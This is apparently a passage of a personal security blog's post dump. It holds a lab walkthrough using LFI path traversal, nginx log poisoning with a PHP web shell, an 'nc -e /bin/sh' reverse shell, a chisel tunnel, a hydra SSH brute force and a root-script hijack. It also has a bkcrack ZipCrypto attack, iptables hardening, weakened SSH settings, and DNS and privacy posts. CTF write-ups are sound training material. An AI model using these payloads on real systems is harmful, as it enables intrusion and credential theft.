traversal/LFI (Local File Inclusion)We can’t access to /uploads, but we can load the file of a god by requesting it in the url.If we look at the url that is showed when we insert the name of a god, we will see that maybe vulnerable to path traversal and/or a LFI.After messing around a while with wfuzz we can found an LFI vulnerability.http://thetruthoftalos.hmv/index.php?filename=....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd/etc/passwdWe can see the system users in the /etc/passwd file.As is a nginx server, we will try to find the access.log and error.log files:http://thetruthoftalos.hmv/index.php?filename=....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//var/log/nginx/access.loghttp://thetruthoftalos.hmv/index.php?filename=....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//var/log/nginx/error.logAs the access.log and error.log files are publicly accessible, we will try a log poisoning:Log poisoning This is the most tricky point.If you do not get the log poisoning on the first attempt because it’s sent or write in a wrong format, php will be interpreted loading the logs, but will throw errors, so the poisoning (and future poisonings) won’t work.At this point, if you fail poisoning the log, and, if you took a snapshot of the fresh install, you can restore the Virtual Machine to its original state very fast.If you didn’t take the snapshot, you will have to reinstall the Virtual Machine, and takes more time.We start a listener on our host:$ nc -lvnp 12345Now, we poison the log and we try to get a reverse shell:$ curl -i -v http://thetruthoftalos.hmv/index.php -A \"&lt;?php system(\\$_REQUEST['cmd']);?&gt;\"$ curl -i -v \"http://thetruthoftalos.hmv/index.php?filename=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F%2Fvar%2Flog%2Fnginx%2Faccess.log&amp;cmd=nc%20-e%20/bin/sh%2010.0.1%2012345\" I did my php payload from zsh, so I had to escape the “$”:If the log poisoning worked, we will have shell as www-data, and we will have to treat our tty to be able to work comfortably:First, we get our terminal size, in the host:$ stty size56 256Now, we treat our new tty in Principle 2:$ script /dev/null -c bashCTRL+Z$ stty raw -echo; fg$ reset xterm$ export TERM=xterm$ export SHELL=bash$ stty rows 56 columns 256User flagWe have Hermanubis’ password for SMB, so let’s see if he has the same password for his user:$ su hermanubisPassword: ByronIsAssholeOk, it worked:$ iduid=1002(hermanubis) gid=1002(hermanubis) groups=1002(hermanubis$ ls -la /home/hermanubis...lrwxrwxrwx 1 root root 9 Nov 25 17:34 .bash_history -&gt; /dev/null-rwx------ 1 hermanubis hermanubis 220 Apr 23 2023 .bash_logout-rwx------ 1 hermanubis hermanubis 3526 Apr 23 2023 .bashrc-rwx------ 1 hermanubis hermanubis 264 Nov 23 21:18 investigation.txt-rwx------ 1 hermanubis hermanubis 807 Apr 23 2023 .profiledrwxr-x--- 2 hermanubis hermanubis 4096 Nov 28 14:44 share-rwx------ 1 hermanubis hermanubis 1080 Nov 25 17:29 user.txtNow, we can get our first flag:$ cat /home/hermanubis/user.txtWhat was Hermanubis investigating?$ cat /home/hermanubis/investigation.txtI am aware that Byron hates me... especially since I lost my password.My friends along with myself after several analyses and attacks, we have detected that Melville is using a 32 character password....What he doesn't know is that it is in the Byron database...Ok, so we know that Melville has a 32 character password.All txt files in /var/backup have 32 characters, so let’s assume that Melville is using an hexadecimal password that is stored in Byron’s backup.And we need a way to exploit this.SSHIf we chek the running services, we will find a running ssh service on port 345:$ systemctl status ssh.service● ssh.service - OpenBSD Secure Shell server ... Active: active (running) since ...$ ss -tunelNetid State Recv-Q Send-Q Local Address:Port Peer Address:Port Process...tcp LISTEN 0 128 [::]:345 [::]:* ino:16724 sk:29 cgroup:/system.slice/ssh.service v6only:1 &lt;-&gt;...We can stablish a reverse proxy using chisel and try to brute force the ssh authentication with hydra.The dictionaryThe first thing we are going to need to perform this attack it’s to create a dictionary with all the neighbors passwords:$ sudo su principle2$ cat /tmp/backups/*.txt &gt; /tmp/neighbors_passwords.txt$ exitChiselWe check which version of chisel we need:$ uname -aLinux principle2 6.1.0-13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.55-1 (2023-09-29) x86_64 GNU/LinuxWe need the amd64 version of chisel, and copy the binary from our host to Principle 2.To do this, we will mount an http server in our host, in the directory where we have the chisel binaries, with python:$ python -m http.server 443And, in Principle 2, we download the chisel bynary from our host:$ wget http://10.0.0.1:443/chisel_1.9.1_linux_amd64$ mv chisel_1.9.1_linux_amd64 chisel$ chmod 700 chiselOnce copied, we will start the chisel server on our host:$ ./chisel_1.9.1_linux_amd64 server --reverse 8080And now, we will start the chisel client on Principle 2:$ ./chisel client 10.0.0.1:8080 R:22222:127.0.0.1:345HydraOnce stablished the reverse proxy we will bruteforce the password from our host using hydra:$ hydra -l melville -P /tmp/neighbors_password.txt -s 22222 127.0.0.1 ssh -f -o /tmp/melvile_pasword.txt$ cat /tmp/melville_password.txt... password: 1bd5528b6def9812acba8eb21562c3ecMelvilleWe connect as Melville using ssh:$ ssh -p 22222 melville@localhostroot is watching you, it has a record of all your steps:Let’s see what we can do:$ iduid=1003(melville) gid=1003(melville) groups=1003(melville),1000(talos)Melville is part of the talos group, interesting.$ cat note.txtDon't touch SUID, it is very DANGEROUSWe heed the warning, and, examining the files, we find the login warning message:$ cat .bashrc | moreecho -e \"root is watching you, it has a record of all your steps:\\n`cat /opt/users.txt`\"We search interesting files that belongs to our user or groups:$ find / -user melville -o -group melville -o -group talos 2&gt;/dev/null | grep -vE '/run/user|/proc|/sys/fs|/dev|/home'/opt/users.txt/usr/bin/updater/usr/local/share/report$ ls -la /opt/users.txt-rw-r----- 1 root talos 95 Dec 11 20:47 /opt/users.txt$ ls -la /usr/bin/updater-rwsr-x--- 1 root melville 16232 Nov 26 11:38 /usr/bin/updater$ ls -la /usr/local/share/report-rwxrwx--- 1 root talos 59 Dec 8 21:07 /usr/local/share/report/opt/users.txt contains a list of the active users and the login time:$ cat /opt/users.txtmelville pts/0 2023-12-18 00:00 (10.0.0.1)And, after investigating the other binaries, we find that /usr/bin/updater it’s only a script which upgrades the system, while /usr/local/share/report is the script used to write the logins (the output of the who command) in /opt/users.txt.As the time stored in /opt/users.txt it’s our login time, we an assume that /usr/local/share/report it’s executed on login.And, if we look closely, we can see that we have write permissions because we are in the talos group.So we can try to hijack this file in order to get the root flag.HijackingWe will override the /usr/local/share/report content with a simple bash script that retrieves the root flag:#!/usr/bin/env bashcat /root/root.txt &gt; /home/melville/root_flag.txtNow, we logout, we login again as melville and we will get the root flag waiting for us in our home!Enjoy! ;)" }, { "title": "Hack the box SecretRezipe", "url": "/posts/htb-secretrezipe/", "categories": "hack the box, challenge", "tags": "hack the box, challenge, misc, htb, SecretRezipe, RSA", "date": "2023-11-26 01:00:01 +0100", "snippet": "Challenge description We have launched a startup that produces soft drinks. We use special ingredients to make them very tasty, so we have a lot of protections on our files to prevent our competit...", "content": "Challenge description We have launched a startup that produces soft drinks. We use special ingredients to make them very tasty, so we have a lot of protections on our files to prevent our competitors from copying our ideas.The webIf we spawn the system, and browse to it, we will find a drinks website called “Refreshing startup”.Refreshing startup webThe only thing that we can do is suggest a recipe and download it.SuggestionsBut, the zip file will be password protected, and we don’t have the password.The filesWhen we extract the SecretRezipe.zip file, we found the misc_secret_rezipe folder.This folder contains a docker container configuration and source files.So, this will be a grey box approach.And, since the objective is not the web, let’s analyze these files.After a while analyzing files, we will have found a pair of interesting things:route.jsconst { FLAG, PASSWORD } = require('./config/config')FLAG and PASSWORD constants requires ‘./config/config’, we will check this file later.let data = `Secret: ${FLAG}`data will always start with “Secret: ${FLAG}”.if (req.body.ingredients) { data += `\\n${req.body.ingredients}`}If there are no ingredients, nothing will be appended to data. const tempPath = os.tmpdir() + '/' + crypto.randomBytes(16).toString('hex') fs.mkdirSync(tempPath); fs.writeFileSync(tempPath + '/ingredients.txt', data) child_process.execSync(`zip -P ${PASSWORD} ${tempPath}/ingredients.zip ${tempPath}/ingredients.txt`) return res.sendFile(tempPath + '/ingredients.zip')The content of the data variable will be written to the ingredients.txt file in a random temporary directory.The the temporary directory will be zipped using the ${PASSWORD} constant as password.And, finally, the zipped file will be sent.config.jstry { var FLAG = fs.readFileSync(\"/flag.txt\")} catch (e) { var FLAG = \"HTB{fake_flag_for_testing}\"}The flag is read from the flag.txt file.And, obviously, “HTB{fake_flag_for_testing}” is a bait.PASSWORD: crypto.randomUUID()Ok. So the password is… A random UUID…As the UUID (or Universally Unique Identifier) is 128 bit label, if we want to bruteforce it we will have to try 2^128 combinations…So much time for this life.ingredients.zipHow we have ruled out brute forde (or I hope so…), let’s analyze the recipe, the zip file:$ 7z l -slt ingredients.zip...Path = tmp/ccc1959a8a4ed397b8ef86e26aba47f0/ingredients.txt...Method = ZipCrypto StoreA simple password-based symmetric encryption system generally known as ZipCrypto. It is documented in the ZIP specification, and known to be seriously flawed. In particular, it is vulnerable to known-plaintext attacks,ZipCrypto is a simple password-based symetric encryption system known to be seriously flawled.And, in particular is vulnerable to kpa (or known-plaintext attacks).I have already talked about the KPAs here, in the post XOR known-plaintext attack, so I won’t stop at this and we will intent exploit this vulnerability.KPA (kwnown-plaintext attack)The first thing we will do is generate an empty recipe.We only want the flag, so wil be enough.And, then, we will attack the ingredients.zip file using bkcrack.The attack will require at least 12 bytes of known plaintext, and at least 8 of them must be contiguous.So, what we do know about our flag?As we have seen in the route.jsfile, the flag will starts by “Secret: “.And we known that all flags in hack the box starts with “HTB{“.So, we will create the plaintext.txt file containing only the string “Secret: HTB{“. I checked this file with a hexadecimal editor to make sure that there was not another characters in the file. Some editor added new characters at the end, and, if there are other characters at the end, the attack will not work.Now, we launch the attack:$ bkcrack -C ingredients.zip -c tmp/ccc1959a8a4ed397b8ef86e26aba47f0/ingredients.txt -p plaintext.txtAfter a while, and, if everithing went well, we will see the keys:[00:00:00] Keys104d144a d3d97394 18e6b1a5Now, we can get our flag:$ bkcrack -C ingredients.zip -c tmp/ccc1959a8a4ed397b8ef86e26aba47f0/ingredients.txt -k KEYS -f decrypted_file.txtSecretRezipe has been PwnedEnjoy! ;)" }, { "title": "Hack The Box - RedTrails pwned!", "url": "/posts/htb-redtrails/", "categories": "hack the box, challenge", "tags": "hack the box, challenge", "date": "2023-11-25 01:00:01 +0100", "snippet": "Description Our SOC team detected a suspicious activity on one of our redis instance. Despite the fact it was password protected it seems that the attacker still obtained access to it. We need to ...", "content": "Description Our SOC team detected a suspicious activity on one of our redis instance. Despite the fact it was password protected it seems that the attacker still obtained access to it. We need to put in place a remediation strategy as soon as possible, to do that it’s necessary to gather more informations about the attack used. NOTE: flag is composed by three parts.RedTrails has been PwnedEnjoy! ;)" }, { "title": "Hack The Box - A Nightmare On Math Street pwned!", "url": "/posts/htb-nightmare-math-street/", "categories": "hack the box, challenge", "tags": "hack the box, challenge", "date": "2023-11-22 01:00:01 +0100", "snippet": "Description Whatever you do, don’t fall asleep… In dream land, math works a little differently. A quiz is coming up. If you fail in your sleep, you fail in real life!SolutionTo solve this challeng...", "content": "Description Whatever you do, don’t fall asleep… In dream land, math works a little differently. A quiz is coming up. If you fail in your sleep, you fail in real life!SolutionTo solve this challenge, I did a python script that you can see at: dreammath.pyA Nightmare On Math Street has been PwnedEnjoy! ;)" }, { "title": "Hack The Box - M0rsarchive pwned!", "url": "/posts/htb-m0rsarchive/", "categories": "hack the box, challenge", "tags": "hack the box, challenge", "date": "2023-11-18 01:00:01 +0100", "snippet": "Description Just unzip the archive … several times …SolutionTo solve this challenge, I did a python script that you can see at: m0rsunarchive.pyM0rsarchive has been PwnedEnjoy! ;)", "content": "Description Just unzip the archive … several times …SolutionTo solve this challenge, I did a python script that you can see at: m0rsunarchive.pyM0rsarchive has been PwnedEnjoy! ;)" }, { "title": "Hack The Box - Diagnostic pwned!", "url": "/posts/htb-diagnostic/", "categories": "hack the box, challenge", "tags": "hack the box, challenge", "date": "2023-11-05 01:00:01 +0100", "snippet": "Description Our SOC has identified numerous phishing emails coming in claiming to have a document about an upcoming round of layoffs in the company. The emails all contain a link to diagnostic.htb...", "content": "Description Our SOC has identified numerous phishing emails coming in claiming to have a document about an upcoming round of layoffs in the company. The emails all contain a link to diagnostic.htb/layoffs.doc. The DNS for that domain has since stopped resolving, but the server is still hosting the malicious document (your docker). Take a look and figure out what’s going owned-diagnostic.Diagnostic has been PwnedEnjoy! ;)" }, { "title": "Hack The Box - Illumination pwned!", "url": "/posts/htb-illumination/", "categories": "hack the box, challenge", "tags": "hack the box, challenge", "date": "2023-11-04 01:00:01 +0100", "snippet": "Description A Junior Developer just switched to a new source control platform. Can you find the secret token?Illumination has been PwnedEnjoy! ;)", "content": "Description A Junior Developer just switched to a new source control platform. Can you find the secret token?Illumination has been PwnedEnjoy! ;)" }, { "title": "Hack The Box - Behind the Scenes pwned!", "url": "/posts/htb-behind-the-scenes/", "categories": "hack the box, challenge", "tags": "hack the box, challenge", "date": "2023-11-04 01:00:01 +0100", "snippet": "Description After struggling to secure our secret strings for a long time, we finally figured out the solution to our problem: Make decompilation harder. It should now be impossible to figure out ...", "content": "Description After struggling to secure our secret strings for a long time, we finally figured out the solution to our problem: Make decompilation harder. It should now be impossible to figure out how our programs work!Behind the Scenes has been PwnedEnjoy! ;)" }, { "title": "New avatar", "url": "/posts/new-avatar/", "categories": "personal, misc", "tags": "personal, avatar", "date": "2023-10-28 02:00:01 +0200", "snippet": "I have a new avatar!My new avatarThe thruth is that I have a new whole collection of avatars thanks to my friend Miguel Sislian.Miguel is an artist, a hacktivist and currently is working as a UI/UX...", "content": "I have a new avatar!My new avatarThe thruth is that I have a new whole collection of avatars thanks to my friend Miguel Sislian.Miguel is an artist, a hacktivist and currently is working as a UI/UX designer.He is really good at what he does, and he did a whole bunch of avatars for me, so we choose the one that made us the most fun.I had been with the same avatar for a long time, so I think it was time to change, and I really love this avatar.So I guess it will be with me for quite some time.I’m really thankful for the work and the laughts :)" }, { "title": "iptables essential rules. A starting point to protect your computer", "url": "/posts/iptables-essential-rules/", "categories": "hardening, firewall", "tags": "hardening, firewall, iptables", "date": "2023-10-22 02:00:01 +0200", "snippet": "Learn how to configure a firewall with iptables from scratch. Protect your Linux systems from attacks with this essential, basic configuration guide. This guide covers syntax, commands, best practi...", "content": "Learn how to configure a firewall with iptables from scratch. Protect your Linux systems from attacks with this essential, basic configuration guide. This guide covers syntax, commands, best practices for a smooth transition, offers a good set of essential rules and includes bash script.Why?All our computers should be using a firewall.Especially those that expose services to the internet.Firewalls are crucial for mantaining the security of our network and protecting our data from external threats.They serve as a first line of defense against malware, cyber criminals and another threaths.In this times, it’s a matter of minutes that botnets finds your exposed service and start attacking it.And this could be the beginning of a bad story…I have an old raspberry pi exposing a SSH service to the internet, I need to connect to it remotely.The SSH access is secured using RSA authentication and fail2ban.But, once botnets discovers the SSH service running, the raspberry begins to receive such amount of petitions that the router is “ddosed” and the internet connection starts to cut.So I decided to set up a firewall to try to avoid network scans, at least those automated ones like those used by the botnets.I decided on iptables due to hardware and software restrictions, and, while I was at it, I also added protections to other kind of attacks and restrictions.I learned a lot along the way, and that’s why I decided to put a configuration file here that I think it’s a good starting point to harden our systems.Why not?nftables is replacing iptables.Basically, nftables, avoids duplication of work and inconsistencies, is easier to configure and mantain and is faster.So, if you are looking for a more comfortable and modern alternative, I invite you to read my article: Migrate from iptables to nftables. Boost your linux firewall performance.Iptables bash script. Basic rules to protect your systemHere’s my iptables starting point rules (as bash script):#!/usr/bin/env bashbin=\"/sbin/iptables\"#Flush rules$bin -P INPUT ACCEPT$bin -P FORWARD ACCEPT$bin -P OUTPUT ACCEPT$bin -t nat -F$bin -t mangle -F$bin -F$bin -X# Set Default Policies (DROP everything first)$bin -P INPUT DROP$bin -P OUTPUT DROP$bin -P FORWARD DROP# Allow all traffic on the loopback interface (the internal 127.0.0.1 address. Essential for local processes).$bin -A INPUT -i lo -j ACCEPT$bin -A OUTPUT -o lo -j ACCEPT# Drop packets with invalid state$bin -A INPUT -m conntrack --ctstate INVALID -j DROP# Allow Established/Related Connections (Crucial for allowing responses)$bin -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT$bin -A OUTPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT# Block incoming traffic form the Zeroconf address range.# This range is used by hosts that use DHCP to adquire their IP address.# An address from this range is asigned when these hosts are unable to find a DHCP server to provide them an address.# This range is also usded to provide addressing when connecting two devices using a crossover cable.$bin -A INPUT -s 168.254.0.0/16 -j DROP# Block incoming traffic coming from TEST-NET$bin -A INPUT -s 192.0.2.0/24 -j DROP# Block incoming traffic coming from the reserved class D$bin -A INPUT -s 224.0.0.0/4 -j DROP# Block incoming traffic coming from the reserved class E$bin -A INPUT -s 240.0.0.0/4 -j DROP# Block incoming traffic coming from the loopback and zero addresses$bin -A INPUT -s 127.0.0.0/8 -j DROP$bin -A INPUT -s 255.255.255.255/32 -j DROP$bin -A INPUT -s 0.0.0.0/8 -j DROP# Spoofing# Deny incoming traffic that has a source address of an IP address assigned to a local interface.# Incoming traffic with the source address of your system is going to be spoofed traffic because you know it cannot be generated by the host.$bin -A INPUT -s 192.168.1.100 -j DROP$bin -A OUTPUT ! -s 192.168.1.100 -j DROP # Deny outgoing traffic that does not have a source address of an interface on the local host.# Port scanners# Drop packages if the connections are too agressive to avoid port scanning.$bin -A INPUT -p tcp --syn -m conntrack --ctstate NEW -m hashlimit --hashlimit-name port_scanners --hashlimit-above 5/second --hashlimit-mode srcip -j DROP$bin -A INPUT -p udp -m conntrack --ctstate NEW -m hashlimit --hashlimit-name port_scanners --hashlimit-above 35/second --hashlimit-mode srcip -j DROP# SSH# Allow incoming SSH connections# Deny outgoing connections is covered by the OUTPUT policy drop$bin -A INPUT -p tcp --dport ssh -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT$bin -A OUTPUT -p tcp --sport ssh -m conntrack --ctstate ESTABLISHED -j ACCEPT# NFSv4$bin -A INPUT -p tcp --dport 2049 -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT$bin -A OUTPUT -p tcp --sport 2049 -m conntrack --ctstate ESTABLISHED -j ACCEPT# Torrent$bin -A INPUT -p tcp -m multiport --dport 55555,55556 -m conntrack --ctstate ESTABLISHED -j ACCEPT$bin -A OUTPUT -p tcp -m multiport --sport 55555,55556 -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT$bin -A INPUT -p udp -m multiport --dport 55555,55556 -m conntrack --ctstate ESTABLISHED -j ACCEPT$bin -A OUTPUT -p udp -m multiport --sport 55555,55556 -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT# Torrent trackers$bin -A INPUT -p tcp --sport 2710 -m conntrack --ctstate ESTABLISHED -m conntrack --ctstate ESTABLISHED -j ACCEPT$bin -A OUTPUT -p tcp --dport 2710 -m conntrack --ctstate NEW,ESTABLISHED -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT$bin -A INPUT -p udp -m multiport --sports 80,451,1337,2710,2960,2980,6969,8080 -m conntrack --ctstate ESTABLISHED -j ACCEPT$bin -A OUTPUT -p udp -m multiport --dports 80,451,1337,2710,2960,2980,6969,8080 -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT# IRC# $bin -A INPUT -p tcp --sport 6697 -m conntrack --ctstate ESTABLISHED -j ACCEPT# $bin -A OUTPUT -p tcp --dport 6697 -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT# DNS$bin -A INPUT -p tcp -m multiport --sports 53,853 -m conntrack --ctstate ESTABLISHED -j ACCEPT$bin -A OUTPUT -p tcp -m multiport --dports 53,853 -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT$bin -A INPUT -p udp -m multiport --sports 53,853 -m conntrack --ctstate ESTABLISHED -j ACCEPT$bin -A OUTPUT -p udp -m multiport --dports 53,853 -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT# HTTP and HTTPS (Allow outgoing http/s connections)$bin -A INPUT -p tcp -m multiport --sports http,https -m conntrack --ctstate ESTABLISHED -j ACCEPT$bin -A OUTPUT -p tcp -m multiport --dports http,https -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT# NTP# test: $ ntpdate -q pool.ntp.org$bin -A INPUT -p udp --sport 123 -m conntrack --ctstate ESTABLISHED -j ACCEPT$bin -A OUTPUT -p udp --dport 123 -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT# Drop Packet fragments$bin -A INPUT -f -j DROP# Bad Flags and other anomalies (Before legitimate traffic)$bin -N BAD_FLAGS$bin -A INPUT -p tcp -j BAD_FLAGS$bin -A BAD_FLAGS -p tcp --tcp-flags SYN,FIN SYN,FIN -j DROP$bin -A BAD_FLAGS -p tcp --tcp-flags SYN,RST SYN,RST -j DROP$bin -A BAD_FLAGS -p tcp --tcp-flags SYN,FIN,PSH SYN,FIN,PSH -j DROP$bin -A BAD_FLAGS -p tcp --tcp-flags SYN,FIN,RST SYN,FIN,RST -j DROP$bin -A BAD_FLAGS -p tcp --tcp-flags SYN,FIN,RST,PSH SYN,FIN,RST,PSH -j DROP$bin -A BAD_FLAGS -p tcp --tcp-flags FIN FIN -j DROP$bin -A BAD_FLAGS -p tcp --tcp-flags ALL NONE -j DROP$bin -A BAD_FLAGS -p tcp --tcp-flags ALL ALL -j DROP$bin -A BAD_FLAGS -p tcp --tcp-flags ALL FIN,URG,PSH -j DROP$bin -A BAD_FLAGS -p tcp --tcp-flags ALL SYN,RST,ACK,FIN,URG -j DROP# SYN flood$bin -A INPUT -p tcp --syn -m limit --limit 100/second --limit-burst 200 -j ACCEPT$bin -A INPUT -p tcp --syn -m connlimit --connlimit-above 30 --connlimit-mask 32 -j REJECT --reject-with tcp-reset$bin -A INPUT -p tcp --syn -j DROP# ICMP# All ICMP responses should be barred except responses to outgoing connections.# Allow outbound echo messages and indbound echo reply messages -&gt; Allows the use of ping from the host.# Allow time exceeded and destination unreaachable messages inbound -&gt; Allow the use of tools such traceroute. # Avoids ICMP flood, ICMP smurf, Ping of death, ICMP nuke...$bin -N ICMP_IN$bin -N ICMP_OUT$bin -A INPUT -p icmp -j ICMP_IN$bin -A OUTPUT -p icmp -j ICMP_OUT$bin -A ICMP_IN -p icmp --icmp-type 0 -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT$bin -A ICMP_IN -p icmp --icmp-type 3 -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT$bin -A ICMP_IN -p icmp --icmp-type 8 -m conntrack --ctstate NEW -j DROP # Only NEW echo requests are dropped$bin -A ICMP_IN -p icmp --icmp-type 11 -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT$bin -A ICMP_OUT -p icmp --icmp-type 8 -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPTMaking iptables rules persistentIf we don’t persist our rules, they will be deleted upon reboot.The best and recommended way to make iptables rules persistent is by using the iptables-persistent package.If we don’t have iptables-persistent installed, we install it:sudo apt install iptables-persistent During the installation, you will be prompted whether to save your current IPv4 and IPv6 rules. Choose “Yes” for both if you have already configured your firewall.To save our current rulings (if we skipped during installation or we made changes):sudo netfilter-persistent save The iptables-persistent service is automatically configured to load the rules from iptables (ipv4) and ip6tables (ipv6) during system startup.Important considerations when using this iptables configurationIf you are going to use this as configuration basis rember a few things: Check the configuration and set the parameters of your computer (e.g.: set your computer ip address, interface[s], and the packet limits of the rules). These are basically protection rules and only allows basic common services as DNS, SSH, NTP and HTTP[S]. Below you have to add the rules that allow legitimate services traffic from your host. Think about your computer needs. Every host has needs and they may not be the same as mine. I set these rules without specify interfaces.In some hosts different interfaces have different needs. In iptables the order of the rules matter. Using the recent or limitmodules instead hashlimit could improve the performance. Don’t forget about IPv6. These are rules for IPv4, but changing the $bin variable to use ip6tables could apply to IPv6.Thanks to Rodrigo Rega for the tips and annotations :)Enjoy! ;)" }, { "title": "SSH legacy support", "url": "/posts/ssh-legacy-support/", "categories": "gnu/linux, administration", "tags": "gnu/linux, administration, ssh", "date": "2023-10-15 02:00:01 +0200", "snippet": "Sometimes we found ourselves in the need of connect from, or to, old devices.With the passage of time it may that these devices and/or their applications became non upgradeable.Meanwhile, SSH keeps...", "content": "Sometimes we found ourselves in the need of connect from, or to, old devices.With the passage of time it may that these devices and/or their applications became non upgradeable.Meanwhile, SSH keeps evolving and disabling insecure key exchange methods (among others).Of course, keep using these devices and applications, is not the most recommended from a security point of view, but, sometimes there’s no alternative.In my case I have an old phone with and old application which uses SSH.Both works very well, and neither can be updated.And I don’t think in replace either ot them in the short term.So, after a fresh install, or after replacing the SSH config file in an update, I know I have to add legacy support to SSH when I see the following message: Unable to negotiate with xxx.xxx.xxx.xxx port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1The solution is allow logins from systems that do not support secure key exchange methods by explicitly enabling insecure key exchange methods.I have to highlight “insecure” here.Anyway, to enable it, we need to add the following lines to the /etc/ssh/sshd_config file:KexAlgorithms +diffie-hellman-group1-sha1,diffie-hellman-group14-sha1,diffie-hellman-group-exchange-sha1HostKeyAlgorithms +ssh-rsa,ssh-dssPubKeyAcceptedAlgorithms +ssh-rsa,ssh-dssEnjoy! ;)" }, { "title": "DNS hardening with Quad9", "url": "/posts/dns-hardening-quad9/", "categories": "hardening, dns", "tags": "hardening, dns, quad9", "date": "2023-09-24 02:00:01 +0200", "snippet": "Nowadays, in times when malware proliferates, who isn’t worried about clicking by mistake (or not) on a malicious link?It’s more, who isn’t worried about a family member or friend, with less comput...", "content": "Nowadays, in times when malware proliferates, who isn’t worried about clicking by mistake (or not) on a malicious link?It’s more, who isn’t worried about a family member or friend, with less computer knowledge, clicking on a malicious link?A wrong click and all your network could be compromised. All your machines…Even if only one machine was compromised, I have to admit that it’s not one of the things I would like to suffer…There’s a few ways to block malicious domains, one of them is Steven Black’s hosts.It’s a great solution, but it has some downsides.First of all, you need to install it in every machine, generate custom host files and take care of keeping it updated (manually or scripting and scheduling a task).This could be ok if you have few machines and you have full access whenever you want to them.But, even so, may cause performance loss on some cases (above all on Windows machines).So, even I think Steven Black’s hosts it’s a great solution, and I use it myself on some machines, what else we can do?We can protect ourselves through our DNS Server.If our DNS server takes care of malware, phishing, spyware, botnets and other threats, we won’t have to!In the best case, if we had machines that never connect to another networks, we will only need change the DNS server on our router (if the router allows it).But, I don’t recommend only this, because, what is normal is that we have laptops and mobile devices that connects to many networks.Device DNS server configuracion usually take precedence over the router’s configuration.So, we will use our custom server although the router doesn’t allow the change and in any network.So, I recommend to change the DNS server in our router (if the router allows it) AND in every machine that we have.Setting a custom DNS server on the router will protect the devices that takes the router’s DNS server by default (such as a new -and unconfigured- computer, or the laptop and/or mobile phone of a family member or friend invited to our house).The proccess to set a custom DNS server differs quite a bit between Windows, GNU/Linux and Android, and between their versions, so I’m not going to go into how do it.The advantages of changing the DNS server, are that we only have to change it one time for each machine and for the router (if the router allows it).And we can keep Steven Black’s hosts as a second layer protection.And, even if we can keep it as updated as we want, we can sleep a bit more peacefully knowing that we are a little safer.Quad9The DNS server I chose to protect myself is Quad9.According to Wikipedia: Quad9 is a global public recursive DNS resolver that aims to protect users from malware and phishing. Quad9 is operated by the Quad9 Foundation, a Swiss public-benefit, not-for-profit foundation with the purpose of improving the privacy and cybersecurity of Internet users, headquartered in Zurich.It is the only global public resolver which is operated not-for-profit, in the public benefit.…Several independent evaluations have found Quad9 to be the most effective (97%) at blocking malware and phishing domains.…The domains which are filtered are not determined by Quad9, but instead supplied to Quad9 by a variety of independent threat-intelligence analysts, using different methodologies.Quad9 was the first to use standards-based strong cryptography to protect the privacy of its users’ DNS queries, and the first to use DNSSEC cryptographic validation to protect users from domain name hijackingQuad9 protects users’ privacy by not retaining or processing the IP address of its users, and is consequently GDPR-compliant.And, according to Quad9: The system uses threat intelligence from more than a dozen of the industry’s leading cybersecurity companies to give a real-time perspective on what websites are safe and what sites are known to include malware or other threats.So, it’s seems a great solution.Once we have seen the why and the how, all that remains is to set Quad9’s DNS servers as our new custom DNS servers:# Quad9's DNS servers for IPv4: 9.9.9.9, 149.112.112.112# Quad9's DNS servers for IPv6: 2620:fe::fe, 2620:fe::9Enjoy! ;)" }, { "title": "Google chrome adPrivacy", "url": "/posts/google-chrome-adprivacy/", "categories": "privacy, chrome", "tags": "privacy, chrome, google, adPrivacy", "date": "2023-09-11 02:00:01 +0200", "snippet": "If you use Chrome, and if you have Google Chrome version 115, you will have seen a new notice regarding privacy: “Enhanced ad privacy in Chrome”.According to Google: Chrome works to keep you safe ...", "content": "If you use Chrome, and if you have Google Chrome version 115, you will have seen a new notice regarding privacy: “Enhanced ad privacy in Chrome”.According to Google: Chrome works to keep you safe and protect your privacy while you browse. New features help protect your identity and give you more control over how advertisers choose which ads to show you. These new features will roll out gradually on computers and Android devices. Chrome notes your topics of interest based on the sites you browse and how often you visit them.Sites can also store info with Chrome about your interests. As you keep browsing, Chrome may be asked to share stored info about ad topics or site-suggested ads to help give you a more personalized ad experience. To measure the performance of ads, limited types of data can be shared among sites and apps.“Enhanced ad privacy in Chrome” it’s an attempt by google to get rid of third party cookies.Google says it’s a better way of traking, since protects your privacy tranferring tracking from websites to Chrome.To do this tracking, Google Chrome is using two mechanisms “Ad topics” and “Site-sugested ads”. “Ad topics” is based on your browsing history and “Site-suggested ads” is based on your activity in a site1.Basically, when you will visit a website, the website will be able to ask Google Chrome which ads are the most relevant to insert for your interests, and Google Chrome will answer based on your browsing history and/or your browsing activity.As you browse, the ads you see will be personalized depending on if the site personalizes ads, this settings and your cookie settings.And, you can enable or disable these features in your Google Chrome settings anytime.Is this better for your privacy than third party cookies tracking methods? Maybe. Or maybe not. But it’s a new way of tracking.So, if you want to disable (or enable) “Ad topics” and/or “Site-suggested adds” you can do it from: Three dot 